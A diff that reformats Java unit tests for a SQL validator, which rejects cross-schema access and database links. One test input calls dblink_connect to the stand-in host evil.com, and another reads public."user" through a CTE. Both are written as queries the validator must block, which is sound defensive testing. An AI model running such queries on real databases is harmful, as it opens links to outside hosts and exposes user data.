@@ -25,8 +25,7 @@ class SqlValidatorTest {
 
   @Test
   void allows_insert_select_within_data_schema() {
-    assertThatCode(
-            () -> validator.validate("INSERT INTO data.t (a, b) SELECT a, b FROM data.s"))
+    assertThatCode(() -> validator.validate("INSERT INTO data.t (a, b) SELECT a, b FROM data.s"))
         .doesNotThrowAnyException();
   }
 
@@ -97,8 +96,7 @@ class SqlValidatorTest {
   void rejects_cte_with_public_reference_inside() {
     assertThatThrownBy(
             () ->
-                validator.validate(
-                    "WITH cte AS (SELECT * FROM public.\"user\") SELECT * FROM cte"))
+                validator.validate("WITH cte AS (SELECT * FROM public.\"user\") SELECT * FROM cte"))
         .isInstanceOf(UnsafeSqlException.class)
         .hasMessageContaining("data");
   }
@@ -130,8 +128,7 @@ class SqlValidatorTest {
 
   @Test
   void rejects_dblink_in_select() {
-    assertThatThrownBy(
-            () -> validator.validate("SELECT dblink_connect('host=evil.com dbname=x')"))
+    assertThatThrownBy(() -> validator.validate("SELECT dblink_connect('host=evil.com dbname=x')"))
         .isInstanceOf(UnsafeSqlException.class)
         .hasMessageContaining("dblink_connect");
   }
